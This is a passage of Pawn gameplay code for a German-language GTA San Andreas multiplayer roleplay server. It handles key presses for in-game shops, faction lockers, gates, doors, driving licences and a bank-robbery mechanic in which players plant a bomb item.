		if(Autochoose[playerid] != -1)
		{
		    for(new x = 0; x < 7; x++) PlayerTextDrawHide(playerid, Autohaus[playerid][x]);
		    Autochoose[playerid] = -1;
		    SetPlayerVirtualWorld(playerid,0);
		    Unfreeze(playerid);
		    SetCameraBehindPlayer(playerid);
		}
		if(MoebelKategorie[playerid] != -1)
		{
		    for(new x = 0; x < sizeof(MoebelKauf[]); x++) PlayerTextDrawHide(playerid,MoebelKauf[playerid][x]);
		    MoebelKategorie[playerid] = -1;
		    Unfreeze(playerid);

		}
		if(FrakAutochoose[playerid] != -1)
		{
      		Unfreeze(playerid);
        	SetCameraBehindPlayer(playerid);
        	FrakAutochoose[playerid] = -1;
        	for(new x = 0; x < 5; x++) PlayerTextDrawHide(playerid, Autohaus[playerid][x]);
        	PlayerTextDrawHide(playerid,Autohaus[playerid][7]);
      	}
      	if(KleidungChoose[playerid] != 0)
		{
		    SetPlayerSkin(playerid,SpielerInfo[playerid][uZiviSkin]);
		    SpielerInfo[playerid][uZiviFrak] = 0;
            KleidungChoose[playerid] = 0;
            Unfreeze(playerid);
            SetCameraBehindPlayer(playerid);
		}
		if(Anion[playerid] == 1)
		{
		    Anion[playerid] = 0;
		    ClearAnimations(playerid);
		}
		for(new e = 0; e < sizeof(Eingaenge); e++)
		{
   			if(IsPlayerInRangeOfPoint(playerid,1,Eingaenge[e][EingangX],Eingaenge[e][EingangY],Eingaenge[e][EingangZ]))
	    	{
 				Teleport(playerid,Eingaenge[e][AusgangX],Eingaenge[e][AusgangY],Eingaenge[e][AusgangZ]);
 				SetPlayerFacingAngle(playerid,Eingaenge[e][AusgangRZ]);
 				break;
	 		}
	 		else if(IsPlayerInRangeOfPoint(playerid,1,Eingaenge[e][AusgangX],Eingaenge[e][AusgangY],Eingaenge[e][AusgangZ]))
   			{
 				Teleport(playerid,Eingaenge[e][EingangX],Eingaenge[e][EingangY],Eingaenge[e][EingangZ]);
 				SetPlayerFacingAngle(playerid,Eingaenge[e][EingangRZ]);
 				break;
	 		}
		}
		if(!IsPlayerInAnyVehicle(playerid) && IstSpielerInFrak(playerid,3) || !IsPlayerInAnyVehicle(playerid) && IstSpielerInFrak(playerid,4))
		{
			new Float:VX,Float:VY,Float:VZ,Float:V2X,Float:V2Y,Float:V2Z;
			GetVehiclePos(GetClosestVehicle(playerid),VX,VY,VZ);
			for(new v = 0; v < MAX_VEHICLES; v++)
			{
				if(IsValidVehicle(v) && GetVehicleModel(v) == 578 && IsVehicleInRangeOfPoint(v,3.0,VX,VY,VZ-0.6))
				{
		  			GetVehiclePos(v,V2X,V2Y,V2Z);
			    	if(VZ > V2Z+0.5 && GetDistanceToVehicle(playerid,GetClosestVehicle(playerid)) < 5)
				    {
				        PutPlayerInVehicle(playerid,GetClosestVehicle(playerid),0);
				        break;
				    }
			    }
		    }
	    }
	}
	else if(newkeys == 132)//Rechte strg taste
	{
 		printf("%s motor",PlayerName(playerid));
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
	    if(IstEinKeinFuehrerscheinFahrzeug(GetPlayerVehicleID(playerid))) return 1;
		new engine,lights,alarm,doors,bonnet,boot,objective,veh = GetPlayerVehicleID(playerid);
		GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
		if(Motorschaden2[GetPlayerVehicleID(playerid)] == 0)
		{
			if(engine == VEHICLE_PARAMS_OFF || engine == -1)
			{
				if(Benzin[veh] == 0) return GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~r~Tank leer",1500,3);
			    SetVehicleParamsEx(veh,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
			    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
			    {
			        PlayerTextDrawSetString(i, TachoText[i][8], "Motor: ~g~ein");
			    }
			}
			else
			{
			    SetVehicleParamsEx(veh,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
			    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
			    {
			       PlayerTextDrawSetString(i, TachoText[i][8], "Motor: ~r~aus");
			    }
			}
		}
		else
		{
		    SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug hat einen Motorschaden. Rufe das Fire & Rescue Departments!");
		}
	}
	else if(newkeys == 262144)
	{
	    new Float:RX,Float:RY,Float:RZ;
	    new Float:RX2,Float:RY2,Float:RZ2;
		if(IsPlayerInRangeOfPoint(playerid,4,1837.0320,-9250.5625,4.4142) || IsPlayerInRangeOfPoint(playerid,4,6384.2144,-7761.2612,4.3729))
		{
            ShowPlayerDialog(playerid,DIALOG_STADTHALLE,DIALOG_STYLE_LIST,"Stadthalle - Was möchtest du unternehmen?","Personalausweis beantragen\nFraktionslosengeld beantragen\nKennzeichen beantragen\nArbeitsamt - Job auswählen\nWerbung schreiben","Weiter","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,6465.2886,-7625.7285,4.4096))
		{
			if(event_state==0)
			{
				ShowPlayerDialog(playerid, DIALOG_EVENTCREATE, DIALOG_STYLE_LIST, "Event Park","• Paintball Event erstellen\nKartbahn Event erstellen (CLOSED)", "Ok", "Nein");
			}
			if(event_state>0){ShowPlayerDialog(playerid, DIALOG_EVENTJOIN, DIALOG_STYLE_MSGBOX, "Event Park","Möchtest du dem Event beitreten?", "Ja", "Nein");}
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,6451.4619,-8141.5786,4.4018))
		{
		    ShowPlayerDialog(playerid,DIALOG_FISCHE,DIALOG_STYLE_MSGBOX,"Fischmarkt","Willkommen am Fischmarkt\n\nHier kannst du all deine Fische verkaufen! Ich gebe dir dafür einen gerechten Preis!","Okey","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,3362.6692,-8589.4004,4.3878) && SpielerInfo[playerid][uJob] == 5 && PlayerTruckmodus[playerid] == 2)
		{
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_CARRY);
         	SetPlayerAttachedObject(playerid, 9, 1221, 5, 0.302, 0.378, 0.071, -65.299, 0.000, 0.899);
         	PlayerProdukt[playerid] = 10;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6508.5796, -8011.4941, 1.1523))
		{
		    MoveDynamicObject(sftor,6505.8643, -8018.2754, 4.5205,1);
			SetTimer("sftorzu",10000,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,6575.0317,-7799.4150,4.4096))
		{
			new string[150];
			if(SpielerInfo[playerid][uLeiter] > 0)
			{
			    SendClientMessage(playerid,COLOR_GREEN,"Mit der 'Leertaste' kannst du einen kauf tätigen, mit der Taste 'Enter' abbrechen!");
				FrakAutochoose[playerid] = 0;
				for(new x = 0; x < 5; x++) PlayerTextDrawShow(playerid, Autohaus[playerid][x]);
				format(string,sizeof string,"Autoname: %s",AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][0]-399][AutoName]);
				PlayerTextDrawSetString(playerid,Autohaus[playerid][1],string);
				format(string,sizeof string,"Preis: %d$",AutoListePreise[SpielerInfo[playerid][uLeiter]-1][0]);
				PlayerTextDrawSetString(playerid,Autohaus[playerid][2],string);
				if(AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][0]-399][aKraftstoff] == 0) PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Diesel");
				else PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Benzin");
				format(string,sizeof string,"Tank: %dL",AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][0]-399][MaxBenzin]);
				PlayerTextDrawSetString(playerid,Autohaus[playerid][4],string);
				PlayerTextDrawSetPreviewModel(playerid,Autohaus[playerid][7], AutoListe[SpielerInfo[playerid][uLeiter]-1][0]);
				PlayerTextDrawShow(playerid, Autohaus[playerid][7]);
				Freeze(playerid);
			}
		}
        else if(IsPlayerInRangeOfPoint(playerid,3.0,6303.6919,-7829.6938,4.4152))//Laden in SF Tankstelle 24/7
		{
		    //inwelchemladen[playerid] = 12929; evtl. zu Tankstellen BIZ SF
		    ShowPlayerDialog(playerid,DIALOG_SHOP,DIALOG_STYLE_LIST,"24/7 Santa Felton","Hotdog -2$\nTelefonbuch -5$\nHandy -200$\nPfandflaschen verkaufen (0,25$ / Stück)\nFahrzeug Repair-Kit -250\nWaren übergeben\nAngel -80$\nMusikbox -120$\nBenzinkanister mit 10 Liter -40$","Weiter","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,1613.9823,-9332.6973,6.5968))
		{
			inwelchemladen[playerid] = 0;
		    ShowPlayerDialog(playerid,DIALOG_SHOP,DIALOG_STYLE_LIST,"24/7 Lake Sorten","Hotdog -2$\nTelefonbuch -5$\nHandy -200$\nPfandflaschen verkaufen (0,25$ / Stück)\nFahrzeug Repair-Kit -250\nWaren übergeben\nAngel -80$\nMusikbox -120$\nBenzinkanister mit 10 Liter -40$","Weiter","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,6419.8208,-9145.4287,4.4061))
		{
		    inwelchemladen[playerid] = 1;
		    ShowPlayerDialog(playerid,DIALOG_SHOP,DIALOG_STYLE_LIST,"24/7 Lake Vortex","Hotdog -2$\nTelefonbuch -5$\nHandy -200$\nPfandflaschen verkaufen (0,25$ / Stück)\nFahrzeug Repair-Kit -250\nWaren übergeben\nAngel -80$\nMusikbox -120$\nBenzinkanister mit 10 Liter -40$","Weiter","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,6358.0835, -9122.0693, 5.4943) && IstSpielerInFrak(playerid,16))
		{
		    //vagos
		    fmerken[playerid] = 5;
		    ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,3739.3452, -9336.2178, 8.7841) && IstSpielerInFrak(playerid,17))
		{
		    //Mayans MC
		    fmerken[playerid] = 6;
		    ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,1717.2190, -8846.1152, 4.1954) && IstSpielerInFrak(playerid,7))
		{
		    //Ballas
		    fmerken[playerid] = 0;
		    ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,4424.9858, -7622.8013, 6.1866) && IstSpielerInFrak(playerid,8))
		{
		    //grove
		    fmerken[playerid] = 1;
		    ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,4225.0386, -7637.5767, 4.7135) && IstSpielerInFrak(playerid,9))
		{
		    //atze
		    fmerken[playerid] = 2;
		    ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,6371.1455, -9356.5811, 3.4988) && IstSpielerInFrak(playerid,10))
		{
		    //LCN
		    fmerken[playerid] = 3;
		    ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,3165.5588, -9242.1621, 4.8591) && IstSpielerInFrak(playerid,11))
		{
		    //yakuza
		    fmerken[playerid] = 4;
		    ShowPlayerDialog(playerid,DIALOG_FLAGER,DIALOG_STYLE_LIST,"Spind","Waffen\nDrogen\nSkins","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1596.1746,-8442.5459,7.0640))
		{
		    ShowPlayerDialog(playerid,DIALOG_FUHR,DIALOG_STYLE_LIST,"Welchen Führerschein möchtest du machen?","Theorie Prüfung -70$\nAutoführerschein -200$\nMotorradführerschein -1000$\nLKW-Führerschein -600$","Los","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,1594.3468,-8441.0205,2.3310))
		{
			if(SpielerInfo[playerid][uWaffenschein] == 0) return SendClientMessage(playerid,COLOR_RED,"Du besitzt keinen Waffenschein!");
			if(SpielerInfo[playerid][uLevel] > 1)
			{
				ShowPlayerDialog(playerid, DIALOG_WAFFENKAUF, DIALOG_STYLE_LIST, "Waffenkauf", "Pistolen\nGewehre und Sturmgewehre\nSchnellfeuerwaffen", "Weiter", "Abbrechen");
			}
			else
			{
				SendClientMessage(playerid,COLOR_RED,"Du bist noch nicht Level 5!");
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,3708.2046,-8905.4316,51.5022))
		{
			ShowPlayerDialog(playerid,DIALOG_SCHWARZM,DIALOG_STYLE_LIST,"Schwarzmarkt","Waffen kaufen\nFische eintauschen/verkaufen","Weiter","Abbrechen");
            if(SpielerInfo[playerid][ufSchwarz] == 0)
	        {
	        	SpielerInfo[playerid][ufSchwarz] = 1;
	        	Missionenaktu(playerid);
	        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Schwarzmarkt {0080FF}(/missionen)");
	        	new Float:belohnung;
            	belohnung = 500;
            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
				GebeGeld(playerid,belohnung);
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,1831.2838,-9262.2881,4.3860) || IsPlayerInRangeOfPoint(playerid,4,6379.5640,-7724.7202,4.3759))
		{
		    if(SpielerInfo[playerid][uStartbonus] == 0)
		    {
		        SpielerInfo[playerid][uStartbonus] = 1;
		        SendClientMessage(playerid,COLOR_GREEN,"Du bekommst 2000$ als Startbonus!");
		        GebeGeld(playerid,2000);
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,1772.5184,-9323.2002,4.4124))
		{
		    SendClientMessage(playerid,COLOR_WHITE,"Maria: Jaja.. vor ein paar Jahren habe ich noch im Waffenladen gearbeitet, diese Arschlöcher haben mich gefeuert!");
		    ShowPlayerDialog(playerid,DIALOG_SKINS,DIALOG_STYLE_LIST,"Skin kaufen","Männliche Kleidung\nWeibliche Kleidung","Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,6418.2349,-7748.8779,4.3636) || IsPlayerInRangeOfPoint(playerid,2,6410.6499,-7752.4932,4.3636) || IsPlayerInRangeOfPoint(playerid,3,1596.9828,-8552.4248,2.3310))
		{
		    new string[50];
			for(new x = 0; x < sizeof(Bankmenu); x++)
			{
			    TextDrawShowForPlayer(playerid,Bankmenu[x]);
			}
			PlayerTextDrawShow(playerid,Bankmenu_Stand[playerid]);
			format(string,sizeof string,"Kontostand: $ %.2f",SpielerInfo[playerid][uKonto]);
			PlayerTextDrawSetString(playerid,Bankmenu_Stand[playerid],string);
			SelectTextDraw(playerid, -8257281);
		}
		else if(IsPlayerInRangeOfPoint(playerid,20,1576.1208, -9452.7764, 7.1065) && IstSpielerInFrak(playerid,2) || IstSpielerInFrak(playerid,1) && IsPlayerInRangeOfPoint(playerid,20,1576.1208, -9452.7764, 7.1065))
		{
		    if(LSPDGATEOFFEN == 0)
		    {
		        LSPDGATEOFFEN = 1;
		        MoveDynamicObject(LSPDGate,1576.1208, -9452.7764, 7.1065,2.0);
		        SendClientMessage(playerid,COLOR_GREEN,"Tor geöffnet");
		        Update3DTextLabelText(LabelPD, 0xFFFFFFFF, "{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das Tor zu schließen");
		    }
		    else
			{
		    	LSPDGATEOFFEN = 0;
		    	MoveDynamicObject(LSPDGate,1576.12085, -9462.30273, 7.10650,2.0);
		    	SendClientMessage(playerid,COLOR_GREEN,"Tor geschlossen");
		    	Update3DTextLabelText(LabelPD, 0xFFFFFFFF, "{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das Tor zu öffnen");
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,2989.3435,-8750.3311,4.7994) && TruckSpritmodus[playerid] == 2)
		{
		    TruckSpritmodus[playerid] = 3;
		    Abpumpen[playerid] = SetTimerEx("Abpumpentimer", 2000, true, "i", playerid);
		    TogglePlayerControllable(playerid, false);
		    ClearAnimations(playerid);
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,1,0,0,18000,0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,20,6541.88721, -7866.26270, 5.04716) && IstSpielerInFrak(playerid,2) || IstSpielerInFrak(playerid,1) && IsPlayerInRangeOfPoint(playerid,20,6541.88721, -7866.26270, 5.04716))
		{
			if(sfpdgatex == 0)
			{
			    sfpdgatex = 1;
			    MoveDynamicObject(sfpdgate,6551.2642, -7866.2627, 5.0472,2);
			    SendClientMessage(playerid,COLOR_GREEN,"Tor geöffnet");

			}
			else
			{
			    sfpdgatex = 0;
			    MoveDynamicObject(sfpdgate,6541.88721, -7866.26270, 5.04716,2);
			    SendClientMessage(playerid,COLOR_RED,"Tor geschlossen");
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,4577.0483, -8699.8193, 3.5964) && IstSpielerInFrak(playerid,15))
		{

	 		new dtext[20],string[120];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
	 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_ARMY1,DIALOG_STYLE_LIST,"U.S. Army Spind",string,"Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1550.0718, -9504.5195, 8.1554) && IstSpielerInFrak(playerid,1))
		{

	 		new dtext[20],string[120];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
	 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1550.0718, -9504.5195, 8.1554) && IstSpielerInFrak(playerid,2))
		{

	 		new dtext[20],string[120];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
	 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6512.0952,-7891.4507,4.6166) && IstSpielerInFrak(playerid,1))
		{

	 		new dtext[20],string[120];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
	 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6458.6426,-7759.3247,4.3736)/*SF*/ || IsPlayerInRangeOfPoint(playerid,3,1668.3450,-9330.4434,4.5889)/*TS*/ || IsPlayerInRangeOfPoint(playerid,3,1759.8478,-9365.5146,4.4144)/*FWLS*/)
		{
			if(IstSpielerInFrak(playerid,3) || IstSpielerInFrak(playerid,4))
			{
		 		new dtext[20],string[120];
				if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
				else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
		 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
				ShowPlayerDialog(playerid,DIALOG_MLS,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind",string,"Auswählen","Abbrechen");
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6512.0952,-7891.4507,4.6166) && IstSpielerInFrak(playerid,2))
		{

	 		new dtext[20],string[120];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
	 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
		}
		//MEDICLS ANFANG TÜREN
		else if(IsPlayerInRangeOfPoint(playerid,2,1731.95764, -9324.08398, 4.65540) && IstSpielerInFrak(playerid,3) || IsPlayerInRangeOfPoint(playerid,2,1731.95764, -9324.08398, 4.65540) && IstSpielerInFrak(playerid,4))
		{
		    if(LSMDDOOR[0] == 0)
		    {
		        LSMDDOOR[0] = 1;
		        GetDynamicObjectRot(LSMDDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(LSMDDOORS[0],RX,RY,90.00000,9);//geöffnet

		    }
		    else
			{
		    	LSMDDOOR[0] = 0;
		    	GetDynamicObjectRot(LSMDDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(LSMDDOORS[0],RX,RY,0.00000,9);//geschlossen
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,6454.8721,-7759.9561,4.3736) && IstSpielerInFrak(playerid,3) || IsPlayerInRangeOfPoint(playerid,4,6454.8721,-7759.9561,4.3736) && IstSpielerInFrak(playerid,4))
		{
		    if(MCTUER1 == 0)
		    {
		    	GetDynamicObjectRot(MEDICDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(MEDICDOOR[0],RX,RY,RZ+90,9);
		    	MCTUER1 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(MEDICDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(MEDICDOOR[0],RX,RY,RZ-90,9);
		    	MCTUER1 = 0;
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,6461.0698,-7729.5156,4.3736) && IstSpielerInFrak(playerid,3) || IsPlayerInRangeOfPoint(playerid,4,6461.0698,-7729.5156,4.3736) && IstSpielerInFrak(playerid,4))
		{
		    if(MCTUER2 == 0)
		    {
		    	GetDynamicObjectRot(MEDICDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(MEDICDOOR[1],RX,RY,RZ+90,9);
		    	MCTUER2 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(MEDICDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(MEDICDOOR[1],RX,RY,RZ-90,9);
		    	MCTUER2 = 0;
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6419.4082,-7756.9336,4.3636))//SF
		{
		    CancelSelectTextDraw(playerid);
		    new cops = 0,bomb = 0;
			if(Banktimer == 0)
			{
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)|| IstSpielerInFrak(i,15)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}
				if(cops == 2)
				{
					for(new x = 0; x < sizeof(SpielerInventar[]); x++)
					{
					    if(SpielerInventar[playerid][x][0] == 29)
					    {
					        Bombenplatz[playerid] = 1;
					        ShowPlayerDialog(playerid,DIALOG_BOMBSETZ,DIALOG_STYLE_MSGBOX,"Bombelegen","Möchtest du wirklich die Bombe setzen?","Ja","Nein");
					        bomb++;
					    }
					}
					if(bomb == 0)
					{
					    SendClientMessage(playerid,COLOR_RED,"Ohne Bombe ist das leider nicht möglich...");
					}
				}
				else SendClientMessage(playerid,COLOR_RED,"Es müssen mindestens zwei Cops im Dienst dafür sein.");
			}
            else SendClientMessage(playerid,COLOR_RED,"Die Banktür kann noch nicht gesprengt werden!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,5, 1436.43591, -7563.22510, 11.88010) && zunderklauen == 0)
		{
		    new cops = 0,bomb = 0;
			if(tresordarf == 1)
			{
				/*for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)|| IstSpielerInFrak(i,15)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}*/
				if(cops == 0)
				{
					for(new x = 0; x < sizeof(SpielerInventar[]); x++)
					{
					    if(SpielerInventar[playerid][x][0] == 29)
					    {
        					Bombenplatz[playerid] = 6;
					        ShowPlayerDialog(playerid,DIALOG_BOMBSETZ,DIALOG_STYLE_MSGBOX,"Bombelegen","Möchtest du wirklich die Bombe setzen?","Ja","Nein");
					        bomb++;
					    }
					}
					if(bomb == 0)
					{
					    SendClientMessage(playerid,COLOR_RED,"Ohne Bombe ist das leider nicht möglich...");
					}
				}
				else SendClientMessage(playerid,COLOR_RED,"Es sind nicht genug Polizisten online!");
			}
            //else SendClientMessage(playerid,COLOR_RED,"Die Tresortür kann noch nicht gesprengt werden!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,5.0,1435.8918,-7562.8794,11.7174) && zunderklauen == 1)
		{
			if(zunderklauen == 1)
			{
			    SendClientMessage(playerid,COLOR_GREEN,"Du hast den Zünder geklaut!");
			    DestroyDynamicObject(Fernbedienung);
			    SetTimer("Fernbedienunge",1000*60*30,0);
			    Verstauen(playerid,19942,1);
			    zunderklauen = 0;
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1427.43787, -7537.79297, 19.24610) || IsPlayerInRangeOfPoint(playerid,5,1428.59412, -7541.41357, 12.19320) || IsPlayerInRangeOfPoint(playerid,5,1429.62158, -7577.70264, 4.17059))
		{
		    new cops = 0,bomb = 0;
			if(treagerstop == 0)
			{
				/*for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)|| IstSpielerInFrak(i,15)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}*/
				if(cops == 0)
				{
					for(new x = 0; x < sizeof(SpielerInventar[]); x++)
					{
					    if(SpielerInventar[playerid][x][0] == 29)
					    {
					        if(IsPlayerInRangeOfPoint(playerid,5,1427.43787, -7537.79297, 19.24610))
					        {
					        	Bombenplatz[playerid] = 3;
							}
							else if(IsPlayerInRangeOfPoint(playerid,5,1428.59412, -7541.41357, 12.19320))
							{
							    Bombenplatz[playerid] = 4;
							}
							else if(IsPlayerInRangeOfPoint(playerid,5,1429.62158, -7577.70264, 4.17059))
							{
							    Bombenplatz[playerid] = 5;
							}
					        ShowPlayerDialog(playerid,DIALOG_BOMBSETZ,DIALOG_STYLE_MSGBOX,"Bombelegen","Möchtest du wirklich die Bombe setzen?","Ja","Nein");
					        bomb++;
					    }
					}
					if(bomb == 0)
					{
					    SendClientMessage(playerid,COLOR_RED,"Ohne Bombe ist das leider nicht möglich...");
					}
				}
				else SendClientMessage(playerid,COLOR_RED,"Es sind nicht genug Polizisten online!");
			}
            else SendClientMessage(playerid,COLOR_RED,"Die Flugzeugträger Tür kann noch nicht gesprengt werden!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,1,4578.9688,-8680.8232,4.5))
		{
		    if(bombenklauen == 0)
		    {
		        new cops = 0;
		        SendClientMessage(playerid,COLOR_RED,"TEST");
		        WFrak(playerid);
		        if(Mitglied[playerid] != 1 && Mitglied[playerid] != 2 && Mitglied[playerid] != 3 && Mitglied[playerid] != 4 && Mitglied[playerid] != 5 && Mitglied[playerid] != 13 && Mitglied[playerid] != 14 && Mitglied[playerid] != 15)
		        {
		            for(new i = 0; i < MAX_PLAYERS; i++)
					{
	 					if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1)
					    {
					        if(IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2) || IstSpielerInFrak(i,15))
					        {
						        cops++;
						        if(cops == 2) break;
							}
					    }
					}
					if(cops == 2)
					{
				        new string[128];
				        SetTimer("Bombensetz",60000*60*2,0);
						Verstauen(playerid,bombenobject,1);
						SendClientMessage(playerid,COLOR_GREEN,"Du hast die Bombe geklaut!");
			   			format(string,sizeof string,"HQ: Die Bombe der U.S. Army wurde geklaut!");
						FraktionsNachricht(1,COLOR_HQ,string);
						format(string,sizeof string,"HQ: Die Bombe der U.S. Army wurde geklaut!");
						FraktionsNachricht(2,COLOR_HQ,string);
			  			for(new i = 0; i < MAX_PLAYERS; i++)
						{
